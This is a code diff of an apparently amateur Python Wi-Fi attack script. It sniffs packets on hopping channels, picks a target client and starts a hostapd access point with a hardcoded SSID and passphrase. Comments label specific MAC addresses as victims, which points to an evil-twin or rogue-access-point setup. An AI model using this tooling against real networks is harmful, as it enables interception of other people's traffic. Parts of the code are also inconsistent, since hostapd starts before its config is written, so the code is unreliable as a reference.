@@ -153,8 +153,55 @@ def print_packets(pkt):
                 print(pkt)
 
 
-def run_script(script_name):
-    subprocess.run(['sudo','python3', script_name])
+def setup_ap(iface_wifi, wifi_channel, ssid, password):
+    # set up the interface to monitor mode
+    os.system(f"sudo ifconfig {iface_wifi} down")
+    os.system(f"sudo iwconfig {iface_wifi} mode monitor")
+    os.system(f"sudo ifconfig {iface_wifi} up")
+
+
+    # Stop any existing DHCP servers
+    subprocess.call(['sudo', 'service', 'isc-dhcp-server', 'stop'])
+
+    # Create a new DHCP server configuration file
+    with open('/etc/dhcp/dhcpd.conf', 'w') as f:
+        f.write('subnet 192.168.42.0 netmask 255.255.255.0 {\n')
+        f.write('    range 192.168.42.10 192.168.42.50;\n')
+        f.write('    option broadcast-address 192.168.42.255;\n')
+        f.write('    option routers 192.168.42.1;\n')
+        f.write('    default-lease-time 600;\n')
+        f.write('    max-lease-time 7200;\n')
+        f.write('    option domain-name "local";\n')
+        f.write('    option domain-name-servers 8.8.8.8, 8.8.4.4;\n')
+        f.write('}\n')
+
+    # Configure the access point
+    subprocess.call(['sudo', 'ifconfig', iface_wifi, '192.168.42.1'])
+    subprocess.call(['sudo', 'hostapd', '-B', '/etc/hostapd/hostapd.conf'])
+    subprocess.call(['sudo', 'service', 'isc-dhcp-server', 'start'])
+
+    # Wait for the access point to start
+    time.sleep(5)
+
+    # config file for the new wifi, with the ssid, password, channel and more
+    config_file = f"""interface={iface_wifi}
+    ssid={ssid}
+    wpa=2
+    wpa_passphrase={password}
+    wpa_key_mgmt=WPA-PSK
+    wpa_pairwise=TKIP
+    rsn_pairwise=CCMP
+    driver=nl80211
+    channel={wifi_channel}"""
+    with open("/etc/hostapd/hostapd.conf", "w") as f:
+        f.write(config_file)
+
+
+
+
+# def run_script(script_name):
+#
+
 
 
 
@@ -169,7 +216,6 @@ chosen_interface = None
 while True:
     # choose randome channel
     currchanel = channels[random.randint(0, len(channels)-1)]
-    currchanel = 11
     print(currchanel)
     # pass the iface(adapter to that channel)
     os.system("iwconfig %s channel %d" % (iface, currchanel))
@@ -226,21 +272,34 @@ while True:
             print(chosen_user)
             print("bad name choose")
         else:
+            print("#######################################################################################################################")
+            print(users_list.get(chosen_user))
+            print("#######################################################################################################################")
             break
 
 
 curr_user = users_list[chosen_user]
-wifi_channel = 6
 wifi_mac_address = "c8:3a:35:c2:e0:a2"
 script_name = 'ap_setup.py'
 
+# args for the setup function
+iface_wifi = "wlxc83a35c2e0a2"
+wifi_channel = 6
+# the ssid and the password of the new wifi
+ssid = "eylon&michael"
+password = "E1y2!3o4n5"
+
+
 
 # run the ap_setup in another thread
-thread = threading.Thread(target=run_script, args=(script_name,))
+thread = threading.Thread(target=setup_ap, args=(iface_wifi, wifi_channel, ssid, password))
 thread.start()
+
 
 # 28:cd:c4:9b:87:f5  victim
 # 5c:b1:3e:ce:bd:35  wifi
+# 34:49:5b:17:a9:b4 ariel wifi
+# 24:18:1d:f7:87:c9 galaxy victim
 
 while flag_user_enters:
     # change the channel to the network che
@@ -261,10 +320,10 @@ while flag_user_enters:
     print(f"the channel is: {chosen_network_interface.CH}")
     print("-----------------------------------------------------------------------------------------------------------------------------")
     # change the channel to the network che
-    os.system("iwconfig %s channel %d" % (iface, wifi_channel))
-    # start to sniff packets for 3 sec
-    sniff(iface=iface, prn=lambda pkt: handle_packets_own_network(pkt, chosen_user, wifi_mac_address),
-          timeout=3)
+    # os.system("iwconfig %s channel %d" % (iface, wifi_channel))
+    # # start to sniff packets for 3 sec
+    # sniff(iface=iface, prn=lambda pkt: handle_packets_own_network(pkt, chosen_user, wifi_mac_address),
+    #       timeout=3)
 
 sniff(iface=iface, prn=lambda pkt: print_packets(pkt))
 
